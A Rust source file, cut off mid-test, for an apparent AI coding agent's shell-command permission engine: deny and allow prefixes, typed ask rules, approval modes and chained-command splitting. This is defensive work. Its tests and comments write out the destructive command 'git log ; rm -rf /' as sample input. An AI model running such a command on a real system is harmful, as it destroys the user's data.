pub mod bash_arity;

use std::collections::HashSet;

use anyhow::Result;
use bash_arity::BashArityDict;
use codewhale_protocol::{NetworkPolicyAmendment, NetworkPolicyRuleAction};
use serde::{Deserialize, Serialize};

/// Priority layer for a permission ruleset. Higher ordinal = higher priority.
/// On conflict, the highest-priority layer's longest matching prefix wins.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum RulesetLayer {
    BuiltinDefault = 0,
    Agent = 1,
    User = 2,
}

/// A named set of allow/deny prefix rules at a given priority layer.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Ruleset {
    /// Priority layer this ruleset belongs to.
    pub layer: RulesetLayer,
    /// Command prefixes that are allowed without requiring approval.
    pub trusted_prefixes: Vec<String>,
    /// Command prefixes that are always blocked, regardless of trust rules.
    pub denied_prefixes: Vec<String>,
    /// Typed rules that mark specific tool invocations as requiring approval.
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub ask_rules: Vec<ToolAskRule>,
}

impl Ruleset {
    /// Creates an empty ruleset at the builtin default priority layer.
    pub fn builtin_default() -> Self {
        Self {
            layer: RulesetLayer::BuiltinDefault,
            trusted_prefixes: vec![],
            denied_prefixes: vec![],
            ask_rules: vec![],
        }
    }

    /// Creates an agent-layer ruleset with the given trusted and denied prefixes.
    pub fn agent(trusted: Vec<String>, denied: Vec<String>) -> Self {
        Self {
            layer: RulesetLayer::Agent,
            trusted_prefixes: trusted,
            denied_prefixes: denied,
            ask_rules: vec![],
        }
    }

    /// Creates a user-layer ruleset with the given trusted and denied prefixes.
    pub fn user(trusted: Vec<String>, denied: Vec<String>) -> Self {
        Self {
            layer: RulesetLayer::User,
            trusted_prefixes: trusted,
            denied_prefixes: denied,
            ask_rules: vec![],
        }
    }

    /// Attaches typed ask rules to this ruleset and returns it.
    pub fn with_ask_rules(mut self, ask_rules: Vec<ToolAskRule>) -> Self {
        self.ask_rules = ask_rules;
        self
    }
}

/// Permission action for a tool invocation rule.
#[derive(Debug, Clone, Copy, Serialize, Deserialize, PartialEq, Eq, PartialOrd, Ord)]
#[serde(rename_all = "snake_case")]
pub enum PermissionAction {
    /// Allow the invocation without asking.
    Allow,
    /// Ask the user before allowing — the approval prompt is forced.
    Ask,
    /// Deny the invocation — the tool call is blocked.
    Deny,
}

fn default_rule_action() -> PermissionAction {
    PermissionAction::Ask
}

/// Typed rule that controls whether a tool invocation is denied, allowed, or requires approval.
///
/// The `action` field governs what happens when this rule matches:
/// - `"deny"` — the tool call is blocked outright (highest priority).
/// - `"ask"` — the approval prompt is forced (default, backward compatible).
/// - `"allow"` — the tool call proceeds without asking.
///
/// Deny always wins over ask, which wins over allow.  Command-prefix-based
/// deny and allow rules are promoted into the execution-policy engine's
/// `denied_prefixes` / `trusted_prefixes` for arity-aware matching;
/// path-only rules are evaluated separately.
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
#[serde(deny_unknown_fields)]
pub struct ToolAskRule {
    /// Name of the tool this rule applies to (e.g. `"exec_shell"`, `"edit_file"`).
    pub tool: String,
    /// Optional command prefix to match against (uses arity-aware matching).
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub command: Option<String>,
    /// Optional file path pattern to match against.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub path: Option<String>,
    /// Action when this rule matches. Default: `"ask"` (backward compatible).
    #[serde(default = "default_rule_action")]
    pub action: PermissionAction,
}

impl ToolAskRule {
    /// Creates a new ask rule matching any invocation of the given tool.
    pub fn new(tool: impl Into<String>) -> Self {
        Self {
            tool: tool.into(),
            command: None,
            path: None,
            action: PermissionAction::Ask,
        }
    }

    /// Creates an ask rule for `exec_shell` matching a specific command prefix.
    pub fn exec_shell(command: impl Into<String>) -> Self {
        Self {
            tool: "exec_shell".to_string(),
            command: Some(command.into()),
            path: None,
            action: PermissionAction::Ask,
        }
    }

    /// Creates an ask rule for a file-tool matching a specific path pattern.
    pub fn file_path(tool: impl Into<String>, path: impl Into<String>) -> Self {
        Self {
            tool: tool.into(),
            command: None,
            path: Some(path.into()),
            action: PermissionAction::Ask,
        }
    }

    fn label(&self) -> String {
        let mut parts = vec![format!("tool={}", self.tool)];
        if let Some(command) = &self.command {
            parts.push(format!("command={command}"));
        }
        if let Some(path) = &self.path {
            parts.push(format!("path={path}"));
        }
        parts.join(" ")
    }
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
#[serde(rename_all = "snake_case")]
/// Policy mode controlling when tool invocations require human approval.
pub enum AskForApproval {
    /// Skip approval if the command matches a trusted prefix; otherwise require it.
    UnlessTrusted,
    /// Allow execution and only request approval after a failure occurs.
    OnFailure,
    /// Always require approval before execution.
    OnRequest,
    /// Reject invocations outright based on specific criteria.
    Reject {
        /// Whether sandbox approval requests are rejected.
        sandbox_approval: bool,
        /// Whether rule-exception requests are rejected.
        rules: bool,
        /// Whether MCP elicitation requests are rejected.
        mcp_elicitations: bool,
    },
    /// Never require approval; forbid commands that would need it.
    Never,
}

/// A proposed amendment to the execution policy, suggesting new trusted prefixes.
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub struct ExecPolicyAmendment {
    /// Command prefixes to add to the trusted list.
    pub prefixes: Vec<String>,
}

/// The approval requirement determined by the execution policy engine.
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub enum ExecApprovalRequirement {
    /// Execution is allowed without approval.
    Skip {
        /// Whether the sandbox should be bypassed for this execution.
        bypass_sandbox: bool,
        /// Optional proposed policy amendment (e.g., to persist the allowed prefix).
        proposed_execpolicy_amendment: Option<ExecPolicyAmendment>,
    },
    /// Execution is allowed but requires human approval first.
    NeedsApproval {
        /// Human-readable reason explaining why approval is needed.
        reason: String,
        /// Optional proposed policy amendment that would be applied on approval.
        proposed_execpolicy_amendment: Option<ExecPolicyAmendment>,
        /// Proposed network policy amendments that would be applied on approval.
        proposed_network_policy_amendments: Vec<NetworkPolicyAmendment>,
    },
    /// Execution is forbidden by policy.
    Forbidden {
        /// Human-readable reason explaining why execution is forbidden.
        reason: String,
    },
}

impl ExecApprovalRequirement {
    /// Returns the human-readable reason for this approval requirement.
    pub fn reason(&self) -> &str {
        match self {
            ExecApprovalRequirement::Skip { .. } => "Execution allowed by policy.",
            ExecApprovalRequirement::NeedsApproval { reason, .. } => reason,
            ExecApprovalRequirement::Forbidden { reason } => reason,
        }
    }

    /// Returns a short phase label: `"allowed"`, `"needs_approval"`, or `"forbidden"`.
    pub fn phase(&self) -> &'static str {
        match self {
            ExecApprovalRequirement::Skip { .. } => "allowed",
            ExecApprovalRequirement::NeedsApproval { .. } => "needs_approval",
            ExecApprovalRequirement::Forbidden { .. } => "forbidden",
        }
    }
}

/// The result of evaluating a command against the execution policy.
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub struct ExecPolicyDecision {
    /// Whether the command is allowed to execute.
    pub allow: bool,
    /// Whether human approval is required before execution.
    pub requires_approval: bool,
    /// The detailed approval requirement, including any proposed amendments.
    pub requirement: ExecApprovalRequirement,
    /// The rule that matched, if any (e.g. a trusted prefix or ask rule label).
    pub matched_rule: Option<String>,
    /// The action of the matched ask-rule, if the match came from a
    /// `ToolAskRule` rather than a prefix.  `None` for prefix matches.
    pub matched_action: Option<PermissionAction>,
}

impl ExecPolicyDecision {
    /// Returns the human-readable reason for this decision.
    pub fn reason(&self) -> &str {
        self.requirement.reason()
    }
}

/// Input context provided to the execution policy engine for a single check.
#[derive(Debug, Clone)]
pub struct ExecPolicyContext<'a> {
    /// The shell command string being evaluated.
    pub command: &'a str,
    /// The current working directory at invocation time.
    pub cwd: &'a str,
    /// The tool name (e.g. `"exec_shell"`, `"edit_file"`). Defaults to `"exec_shell"` when `None`.
    pub tool: Option<&'a str>,
    /// An optional file path relevant to the invocation (used for path-based ask rules).
    pub path: Option<&'a str>,
    /// The current approval policy mode.
    pub ask_for_approval: AskForApproval,
    /// The sandbox mode in effect, if any (e.g. `"workspace-write"`).
    pub sandbox_mode: Option<&'a str>,
}

#[derive(Debug, Clone, Default)]
pub struct ExecPolicyEngine {
    /// Layered rulesets (builtin → agent → user). When non-empty, takes precedence
    /// over the legacy flat lists below.
    rulesets: Vec<Ruleset>,
    /// Legacy flat lists kept for backward compatibility with `new()`.
    trusted_prefixes: Vec<String>,
    denied_prefixes: Vec<String>,
    approved_for_session: HashSet<String>,
    /// Arity dictionary for command-prefix allow-rule matching.
    arity_dict: BashArityDict,
}

impl ExecPolicyEngine {
    /// Legacy constructor: wraps the two vecs into a User-layer ruleset.
    pub fn new(trusted_prefixes: Vec<String>, denied_prefixes: Vec<String>) -> Self {
        Self {
            rulesets: vec![],
            trusted_prefixes,
            denied_prefixes,
            approved_for_session: HashSet::new(),
            arity_dict: BashArityDict::new(),
        }
    }

    /// Build an engine from explicit layered rulesets.
    /// Rulesets are sorted by layer priority on construction.
    pub fn with_rulesets(mut rulesets: Vec<Ruleset>) -> Self {
        rulesets.sort_by_key(|r| r.layer);
        Self {
            rulesets,
            trusted_prefixes: vec![],
            denied_prefixes: vec![],
            approved_for_session: HashSet::new(),
            arity_dict: BashArityDict::new(),
        }
    }

    /// Add a ruleset layer (re-sorts internally).
    pub fn add_ruleset(&mut self, ruleset: Ruleset) {
        self.rulesets.push(ruleset);
        self.rulesets.sort_by_key(|r| r.layer);
    }

    /// Resolve the effective trusted/denied prefix sets by merging all rulesets.
    ///
    /// Collects all prefixes from every layer (builtin → agent → user) into flat
    /// trusted/denied lists. The `check()` method then applies deny-always-wins
    /// semantics: any matching deny prefix blocks the command regardless of layer.
    /// Trusted rules are only consulted after deny checks pass.
    fn resolve_prefixes(&self) -> (Vec<String>, Vec<String>) {
        if self.rulesets.is_empty() {
            return (self.trusted_prefixes.clone(), self.denied_prefixes.clone());
        }
        // Collect all trusted/denied across all layers, highest-priority last so they
        // shadow lower-priority entries with the same prefix.
        let mut trusted: Vec<String> = vec![];
        let mut denied: Vec<String> = vec![];
        for rs in &self.rulesets {
            trusted.extend(rs.trusted_prefixes.iter().cloned());
            denied.extend(rs.denied_prefixes.iter().cloned());
        }
        // Also merge legacy flat lists as user-layer.
        trusted.extend(self.trusted_prefixes.iter().cloned());
        denied.extend(self.denied_prefixes.iter().cloned());
        (trusted, denied)
    }

    fn matching_ask_rule(&self, ctx: &ExecPolicyContext<'_>) -> Option<ToolAskRule> {
        let tool = ctx.tool.unwrap_or("exec_shell");
        let normalized_path = ctx
            .path
            .and_then(|path| normalize_workspace_relative_path(path, ctx.cwd));

        self.rulesets
            .iter()
            .flat_map(|ruleset| {
                ruleset
                    .ask_rules
                    .iter()
                    .map(move |rule| (ruleset.layer, rule))
            })
            .filter(|(_, rule)| rule.tool == tool)
            .filter(|(_, rule)| match rule.command.as_deref() {
                Some(command) => self.arity_dict.allow_rule_matches(command, ctx.command),
                None => true,
            })
            .filter(|(_, rule)| match (rule.path.as_deref(), ctx.path) {
                (Some(pattern), Some(_)) => match (
                    normalize_workspace_relative_path(pattern, ctx.cwd),
                    normalized_path.as_deref(),
                ) {
                    (Some(pattern), Some(path)) => pattern == path,
                    _ => false,
                },
                (Some(_), None) => false,
                (None, _) => true,
            })
            .max_by_key(|(layer, rule)| (*layer, rule.action, ask_rule_specificity(rule)))
            .map(|(_, rule)| rule.clone())
    }

    /// Records an approval key for the current session so subsequent checks skip approval.
    pub fn remember_session_approval(&mut self, approval_key: String) {
        self.approved_for_session.insert(approval_key);
    }

    /// Returns whether the given approval key has been recorded for this session.
    pub fn is_session_approved(&self, approval_key: &str) -> bool {
        self.approved_for_session.contains(approval_key)
    }

    /// Evaluates a command against the policy and returns a decision.
    ///
    /// The evaluation order is: deny rules first (always win), then trusted prefix
    /// matching (arity-aware), then typed ask rules, and finally the approval mode.
    pub fn check(&self, ctx: ExecPolicyContext<'_>) -> Result<ExecPolicyDecision> {
        let normalized = normalize_command(ctx.command);
        let (trusted_prefixes, denied_prefixes) = self.resolve_prefixes();
        // Deny rules use word-boundary prefix matching: the command must either
        // equal the rule or start with the rule followed by a space, so "rm"
        // blocks "rm -rf /" but NOT "rmdir" or "rmview".
        let segments = command_segments(ctx.command);
        if let Some(rule) = denied_prefixes.iter().find(|rule| {
            let norm_rule = normalize_command(rule);
            // Match the whole command OR any chained segment (word-boundary).
            std::iter::once(normalized.clone())
                .chain(segments.iter().map(|seg| normalize_command(seg)))
                .any(|hay| {
                    hay == norm_rule
                        || (hay.starts_with(&norm_rule)
                            && hay.as_bytes().get(norm_rule.len()) == Some(&b' '))
                })
        }) {
            return Ok(ExecPolicyDecision {
                allow: false,
                requires_approval: false,
                matched_rule: Some(rule.clone()),
                matched_action: None,
                requirement: ExecApprovalRequirement::Forbidden {
                    reason: format!("Command blocked by denied prefix rule '{rule}'"),
                },
            });
        }

        // Allow (trusted) rules use arity-aware prefix matching so that
        // `auto_allow = ["git status"]` matches `git status -s` but NOT
        // `git push origin main`.
        // A trusted/allow prefix auto-approves only a SINGLE-segment command;
        // it must not sweep a chained destructive suffix (`git log ; rm -rf /`)
        // into "trusted" (#security). Chained commands fall through to the
        // normal ask/mode gate.
        let trusted_rule = if command_is_chained(ctx.command) {
            None
        } else {
            trusted_prefixes
                .iter()
                .find(|rule| self.arity_dict.allow_rule_matches(rule, ctx.command))
                .cloned()
        };
        let is_trusted = trusted_rule.is_some();

        // Segment-aware typed Deny: a Deny ask-rule matching ANY chained
        // segment must block, mirroring the denied-prefix fix above.
        if command_is_chained(ctx.command) {
            for seg in &segments {
                let mut seg_ctx = ctx.clone();
                seg_ctx.command = seg.as_str();
                if let Some(rule) = self.matching_ask_rule(&seg_ctx)
                    && rule.action == PermissionAction::Deny
                {
                    return Ok(ExecPolicyDecision {
                        allow: false,
                        requires_approval: false,
                        matched_rule: Some(rule.label()),
                        matched_action: Some(PermissionAction::Deny),
                        requirement: ExecApprovalRequirement::Forbidden {
                            reason: format!(
                                "Permission rule '{}' explicitly denies a chained segment of this invocation.",
                                rule.label()
                            ),
                        },
                    });
                }
            }
        }

        let ask_rule = self.matching_ask_rule(&ctx);

        // Handle explicit deny/allow actions before mode-based resolution.
        // Deny wins over everything; allow skips approval regardless of mode.
        if let Some(rule) = &ask_rule {
            match rule.action {
                PermissionAction::Deny => {
                    return Ok(ExecPolicyDecision {
                        allow: false,
                        requires_approval: false,
                        matched_rule: Some(rule.label()),
                        matched_action: Some(PermissionAction::Deny),
                        requirement: ExecApprovalRequirement::Forbidden {
                            reason: format!(
                                "Permission rule '{}' explicitly denies this invocation.",
                                rule.label()
                            ),
                        },
                    });
                }
                PermissionAction::Allow => {
                    return Ok(ExecPolicyDecision {
                        allow: true,
                        requires_approval: false,
                        matched_rule: Some(rule.label()),
                        matched_action: Some(PermissionAction::Allow),
                        requirement: ExecApprovalRequirement::Skip {
                            bypass_sandbox: false,
                            proposed_execpolicy_amendment: None,
                        },
                    });
                }
                PermissionAction::Ask => {
                    // Fall through to existing mode-based logic below.
                }
            }
        }

        let mut matched_ask_rule = None;
        // Resolve a matching typed ask-rule first. Ask-rules take precedence over
        // mode-based handling for everything except `Never` (which forbids,
        // because no prompt can be shown) and `Reject { rules: true }` (which
        // explicitly rejects rule-exceptions). This ordering is checked against
        // the experimental `if let` match-guard the original PR used; it is
        // reproduced here with plain control flow for edition-2024 stable.
        let ask_rule_requirement = match &ctx.ask_for_approval {
            AskForApproval::Never | AskForApproval::Reject { rules: true, .. } => None,
            _ => ask_rule.as_ref().map(|rule| {
                matched_ask_rule = Some(rule.label());
                ExecApprovalRequirement::NeedsApproval {
                    reason: format!("Typed ask rule '{}' requires approval.", rule.label()),
                    proposed_execpolicy_amendment: None,
                    // A typed ask-rule approval (exec/fn/MCP) must not touch
                    // network policy. The original PR allow-listed `ctx.cwd` as a
                    // network host here, which is incorrect and security-relevant:
                    // approving e.g. an exec rule should never create a network
                    // allow-entry. Emit no network amendments for ask-rule prompts.
                    proposed_network_policy_amendments: Vec::new(),
                }
            }),
        };

        let requirement = if let Some(req) = ask_rule_requirement {
            req
        } else {
            match &ctx.ask_for_approval {
                AskForApproval::Never => {
                    if let Some(rule) = &ask_rule {
                        matched_ask_rule = Some(rule.label());
                        ExecApprovalRequirement::Forbidden {
                            reason: format!(
                                "Typed ask rule '{}' requires approval, but approval policy is never.",
                                rule.label()
                            ),
                        }
                    } else {
                        ExecApprovalRequirement::Skip {
                            bypass_sandbox: false,
                            proposed_execpolicy_amendment: None,
                        }
                    }
                }
                AskForApproval::Reject { rules, .. } if *rules => {
                    ExecApprovalRequirement::Forbidden {
                        reason: "Policy is configured to reject rule-exceptions.".to_string(),
                    }
                }
                AskForApproval::UnlessTrusted if is_trusted => ExecApprovalRequirement::Skip {
                    bypass_sandbox: false,
                    proposed_execpolicy_amendment: None,
                },
                AskForApproval::OnFailure => ExecApprovalRequirement::Skip {
                    bypass_sandbox: false,
                    proposed_execpolicy_amendment: None,
                },
                _ => ExecApprovalRequirement::NeedsApproval {
                    reason: if is_trusted {
                        "Approval requested by policy mode.".to_string()
                    } else {
                        "Unmatched command prefix requires approval.".to_string()
                    },
                    proposed_execpolicy_amendment: if is_trusted || command_is_chained(ctx.command)
                    {
                        None
                    } else {
                        Some(ExecPolicyAmendment {
                            prefixes: vec![first_token(ctx.command)],
                        })
                    },
                    proposed_network_policy_amendments: vec![NetworkPolicyAmendment {
                        host: ctx.cwd.to_string(),
                        action: NetworkPolicyRuleAction::Allow,
                    }],
                },
            }
        };

        let (allow, requires_approval) = match requirement {
            ExecApprovalRequirement::Skip { .. } => (true, false),
            ExecApprovalRequirement::NeedsApproval { .. } => (true, true),
            ExecApprovalRequirement::Forbidden { .. } => (false, false),
        };

        Ok(ExecPolicyDecision {
            allow,
            requires_approval,
            matched_rule: matched_ask_rule.or(trusted_rule),
            matched_action: ask_rule.as_ref().map(|r| r.action),
            requirement,
        })
    }
}

/// Split a shell command into its top-level segments on the chaining/pipe
/// operators (`&&`, `||`, `;`, `|`, and newlines). Deny rules must match a
/// target command in ANY segment, not just when it leads the command — a
/// leading benign command (`ls && npm publish`) must not shield a denied
/// suffix. Over-splitting is safe here: it only makes deny matching stricter.
fn command_segments(command: &str) -> Vec<String> {
    command
        .replace("&&", "\n")
        .replace("||", "\n")
        .replace(['|', ';'], "\n")
        .lines()
        .map(str::trim)
        .filter(|segment| !segment.is_empty())
        .map(ToOwned::to_owned)
        .collect()
}

/// True when the command chains multiple top-level segments — a trusted/allow
/// rule that matches one segment must NOT auto-approve the whole chain
/// (`git log ; rm -rf /` is not "just git log").
fn command_is_chained(command: &str) -> bool {
    command_segments(command).len() > 1
}

fn normalize_command(value: &str) -> String {
    // Normalize: lowercase, collapse internal whitespace to single spaces.
    // This prevents bypass via "git  status" (double space) vs "git status".
    value
        .split_whitespace()
        .collect::<Vec<_>>()
        .join(" ")
        .to_ascii_lowercase()
}

fn first_token(command: &str) -> String {
    command
        .split_whitespace()
        .next()
        .unwrap_or_default()
        .to_string()
}

/// Returns a slash-separated path relative to `workspace_root` when `value` is
/// a safe path within that workspace.
///
/// Paths are normalized lexically so matching does not depend on the host OS
/// or require the path to exist. A `..` segment is rejected rather than
/// collapsed, preventing traversal from becoming matchable. Absolute paths
/// must have the workspace as a whole-component prefix; relative paths are
/// interpreted as workspace-relative. Backslashes are accepted so persisted
/// rules and tool inputs behave consistently on Windows.
///
/// This is the canonical normalization shared by ask-rule matching and rule
/// persistence: callers that save a file ask rule should store the value this
/// returns so the saved path matches the same invocation later. `None` means
/// the path is empty, traversing, drive-relative, or outside the workspace and
/// must not be turned into a rule.
pub fn normalize_workspace_relative_path(value: &str, workspace_root: &str) -> Option<String> {
    let path = parse_path_for_matching(value)?;
    let workspace = parse_path_for_matching(workspace_root)?;
    let workspace_root = workspace.root.as_ref()?;

    let relative_components = match path.root.as_ref() {
        Some(path_root) => {
            if path_root != workspace_root {
                return None;
            }
            path.components.strip_prefix(&workspace.components[..])?
        }
        None => path.components.as_slice(),
    };

    Some(relative_components.join("/"))
}

#[derive(Debug)]
struct PathForMatching {
    root: Option<String>,
    components: Vec<String>,
}

fn parse_path_for_matching(value: &str) -> Option<PathForMatching> {
    let value = value.trim().replace('\\', "/").to_ascii_lowercase();
    if value.is_empty() {
        return None;
    }

    let (root, components) = if let Some(path) = value.strip_prefix('/') {
        (Some("/".to_string()), path)
    } else if is_windows_absolute_path(&value) {
        (Some(value[..2].to_string()), &value[3..])
    } else if has_windows_drive_prefix(&value) {
        // `C:foo` is drive-relative on Windows. Treating it as a
        // workspace-relative path could match outside the workspace.
        return None;
    } else {
        (None, value.as_str())
    };

    let mut normalized_components = Vec::new();
    for component in components.split('/') {
        match component {
            "" | "." => {}
            ".." => return None,
            component => normalized_components.push(component.to_string()),
        }
    }

    Some(PathForMatching {
        root,
        components: normalized_components,
    })
}

fn is_windows_absolute_path(value: &str) -> bool {
    let bytes = value.as_bytes();
    bytes.len() >= 3 && bytes[0].is_ascii_alphabetic() && bytes[1] == b':' && bytes[2] == b'/'
}

fn has_windows_drive_prefix(value: &str) -> bool {
    let bytes = value.as_bytes();
    bytes.len() >= 2 && bytes[0].is_ascii_alphabetic() && bytes[1] == b':'
}

fn ask_rule_specificity(rule: &ToolAskRule) -> usize {
    rule.tool.len()
        + rule
            .command
            .as_ref()
            .map_or(0, |command| command.len() + 1000)
        + rule.path.as_ref().map_or(0, |path| path.len() + 1000)
}

#[cfg(test)]
mod tests {
    use super::*;
    use AskForApproval::*;

    fn ctx(command: &str, ask_for_approval: AskForApproval) -> ExecPolicyContext<'_> {
        ExecPolicyContext {
            command,
            cwd: "/workspace",
            tool: Some("exec_shell"),
            path: None,
            ask_for_approval,
            sandbox_mode: Some("workspace-write"),
        }
    }

    #[test]
    fn denied_prefix_blocks_a_chained_segment() {
        // #security: a leading benign command must not shield a denied suffix.
        let engine = ExecPolicyEngine::new(vec![], vec!["npm publish".to_string()]);
        for cmd in [
            "ls && npm publish",
            "true; npm publish",
            "echo hi || npm publish",
            "cat x | npm publish",
        ] {
            let decision = engine
                .check(ctx(cmd, AskForApproval::UnlessTrusted))
                .unwrap();
            assert!(!decision.allow, "{cmd} should be denied");
            assert!(
                matches!(
                    decision.requirement,
                    ExecApprovalRequirement::Forbidden { .. }
                ),
                "{cmd}"
            );
        }
        // And the leading form still blocks.
        let d = engine
            .check(ctx(
                "npm publish --tag latest",
                AskForApproval::UnlessTrusted,
            ))
            .unwrap();
        assert!(!d.allow);
    }

    #[test]
    fn denied_prefix_does_not_over_match_unrelated_commands() {
        let engine = ExecPolicyEngine::new(vec![], vec!["npm publish".to_string()]);
        // Word-boundary: "npm publishx" / a segment that merely mentions it
        // as an argument must not falsely deny.
        let d = engine
            .check(ctx("ls && echo npm publish", AskForApproval::UnlessTrusted))
            .unwrap();
        // "echo npm publish" segment does not START with "npm publish", so no deny.
        assert!(d.allow || d.requires_approval, "unexpected deny: {d:?}");
    }

    #[test]
    fn trusted_prefix_does_not_auto_approve_a_chained_command() {
        // #security: `git log ; rm -rf /` must not be "trusted" because git log is.
        let engine = ExecPolicyEngine::new(vec!["git log".to_string()], vec![]);
        let decision = engine
            .check(ctx("git log ; rm -rf /", AskForApproval::UnlessTrusted))
            .unwrap();
        // Not auto-skipped as trusted (chained); falls through to require approval.
        assert!(
            !matches!(decision.requirement, ExecApprovalRequirement::Skip { .. }),
            "chained command wrongly trusted: {decision:?}"
        );
        // The single-segment form is still trusted.
        let single = engine
            .check(ctx("git log --oneline", AskForApproval::UnlessTrusted))
            .unwrap();
        assert!(single.allow && !single.requires_approval);
    }

    #[test]
    fn trusted_prefix_skips_approval_when_policy_is_unless_trusted() {
        let engine = ExecPolicyEngine::new(vec!["git status".to_string()], vec![]);

        let decision = engine
            .check(ctx("git status --porcelain", AskForApproval::UnlessTrusted))
            .unwrap();

        assert!(decision.allow);
        assert!(!decision.requires_approval);
        assert_eq!(decision.matched_rule.as_deref(), Some("git status"));
        assert!(matches!(
            decision.requirement,
            ExecApprovalRequirement::Skip {
                bypass_sandbox: false,
                proposed_execpolicy_amendment: None,
            }
        ));
    }

    #[test]
    fn denied_prefix_blocks_even_when_command_is_also_trusted() {
        let engine = ExecPolicyEngine::new(
            vec!["git status".to_string()],
            vec!["git status".to_string()],
        );

        let decision = engine
            .check(ctx("git status --porcelain", AskForApproval::UnlessTrusted))
            .unwrap();

        assert!(!decision.allow);
        assert!(!decision.requires_approval);
        assert_eq!(decision.matched_rule.as_deref(), Some("git status"));
        assert!(matches!(
            decision.requirement,
            ExecApprovalRequirement::Forbidden { .. }
        ));
        assert_eq!(
            decision.reason(),
            "Command blocked by denied prefix rule 'git status'"
        );
    }

    #[test]
    fn unmatched_command_requires_approval_and_proposes_first_token_rule() {
        let engine = ExecPolicyEngine::new(vec![], vec![]);

        let decision = engine
            .check(ctx("cargo test --workspace", AskForApproval::UnlessTrusted))
            .unwrap();

        assert!(decision.allow);
        assert!(decision.requires_approval);
        assert_eq!(decision.matched_rule, None);
        match decision.requirement {
            ExecApprovalRequirement::NeedsApproval {
                proposed_execpolicy_amendment: Some(amendment),
                proposed_network_policy_amendments,
                ..
            } => {
                assert_eq!(amendment.prefixes, vec!["cargo"]);
                assert_eq!(
                    proposed_network_policy_amendments,
                    vec![NetworkPolicyAmendment {
                        host: "/workspace".to_string(),
                        action: NetworkPolicyRuleAction::Allow,
                    }]
                );
            }
            other => panic!("expected approval with proposed amendment, got {other:?}"),
        }
    }

    #[test]
    fn trusted_command_in_on_request_mode_still_requires_approval_without_new_rule() {
        let engine = ExecPolicyEngine::new(vec!["cargo test".to_string()], vec![]);

        let decision = engine
            .check(ctx("cargo test --workspace", AskForApproval::OnRequest))
            .unwrap();

        assert!(decision.allow);
        assert!(decision.requires_approval);
        assert_eq!(decision.matched_rule.as_deref(), Some("cargo test"));
        match decision.requirement {
            ExecApprovalRequirement::NeedsApproval {
                proposed_execpolicy_amendment,
                ..
            } => assert_eq!(proposed_execpolicy_amendment, None),
            other => panic!("expected approval without amendment, got {other:?}"),
        }
    }

    #[test]
    fn reject_rules_mode_forbids_unmatched_command() {
        let engine = ExecPolicyEngine::new(vec![], vec![]);

        let decision = engine
            .check(ctx(
                "npm install",
                AskForApproval::Reject {
                    sandbox_approval: false,
                    rules: true,
                    mcp_elicitations: false,
                },
            ))
            .unwrap();

        assert!(!decision.allow);
        assert!(!decision.requires_approval);
        assert_eq!(decision.matched_rule, None);
        assert_eq!(decision.requirement.phase(), "forbidden");
        assert_eq!(
            decision.reason(),
            "Policy is configured to reject rule-exceptions."
        );
    }

    #[test]
    fn typed_ask_rule_forbids_matching_command_when_policy_is_never() {
        let engine = ExecPolicyEngine::with_rulesets(vec![
            Ruleset::user(vec![], vec![])
                .with_ask_rules(vec![ToolAskRule::exec_shell("cargo test")]),
        ]);

        let decision = engine
            .check(ctx("cargo test --workspace", AskForApproval::Never))
            .unwrap();

        assert!(!decision.allow);
        assert!(!decision.requires_approval);
        assert_eq!(
            decision.matched_rule.as_deref(),
            Some("tool=exec_shell command=cargo test")
        );
        assert_eq!(decision.requirement.phase(), "forbidden");
        assert_eq!(
            decision.reason(),
            "Typed ask rule 'tool=exec_shell command=cargo test' requires approval, but approval policy is never."
        );
    }

    #[test]
    fn typed_ask_rule_requires_approval_under_unless_trusted() {
        let engine = ExecPolicyEngine::with_rulesets(vec![
            Ruleset::user(vec![], vec![])
                .with_ask_rules(vec![ToolAskRule::exec_shell("cargo test")]),
        ]);

        let decision = engine
            .check(ctx("cargo test --workspace", AskForApproval::UnlessTrusted))
            .unwrap();

        assert!(decision.allow);
        assert!(decision.requires_approval);
        assert_eq!(
            decision.matched_rule.as_deref(),
            Some("tool=exec_shell command=cargo test")
        );
        match decision.requirement {
            ExecApprovalRequirement::NeedsApproval {
                proposed_execpolicy_amendment,
                proposed_network_policy_amendments,
                ..
            } => {
                assert_eq!(proposed_execpolicy_amendment, None);
                // A typed ask-rule approval must not allow-list the cwd (or
                // anything else) as a network host. See the NeedsApproval arm.
                assert!(
                    proposed_network_policy_amendments.is_empty(),
                    "ask-rule approval must not propose network amendments, got {proposed_network_policy_amendments:?}"
                );
            }
            other => panic!("expected typed ask approval, got {other:?}"),
        }
    }

    #[test]
    fn typed_ask_rule_requires_approval_under_on_failure() {
        let engine = ExecPolicyEngine::with_rulesets(vec![
            Ruleset::user(vec![], vec![])
                .with_ask_rules(vec![ToolAskRule::exec_shell("cargo test")]),
        ]);

        let decision = engine
            .check(ctx("cargo test --workspace", AskForApproval::OnFailure))
            .unwrap();

        assert!(decision.allow);
        assert!(decision.requires_approval);
        assert_eq!(
            decision.reason(),
            "Typed ask rule 'tool=exec_shell command=cargo test' requires approval."
        );
    }

    #[test]
    fn typed_ask_rule_overrides_trusted_but_not_deny() {
        let engine = ExecPolicyEngine::with_rulesets(vec![
            Ruleset::user(
                vec!["cargo test".to_string()],
                vec!["cargo test --danger".to_string()],
            )
            .with_ask_rules(vec![ToolAskRule::exec_shell("cargo test")]),
        ]);

        let trusted = engine
            .check(ctx("cargo test --workspace", AskForApproval::UnlessTrusted))
            .unwrap();
        assert!(trusted.allow);
        assert!(trusted.requires_approval);
        assert_eq!(
            trusted.matched_rule.as_deref(),
            Some("tool=exec_shell command=cargo test")
        );

        let denied = engine
            .check(ctx("cargo test --danger", AskForApproval::Never))
            .unwrap();
        assert!(!denied.allow);
        assert!(!denied.requires_approval);
        assert_eq!(denied.matched_rule.as_deref(), Some("cargo test --danger"));
        assert_eq!(
            denied.reason(),
            "Command blocked by denied prefix rule 'cargo test --danger'"
        );
    }

    #[test]
    fn typed_ask_rule_prefers_higher_layer_before_specificity() {
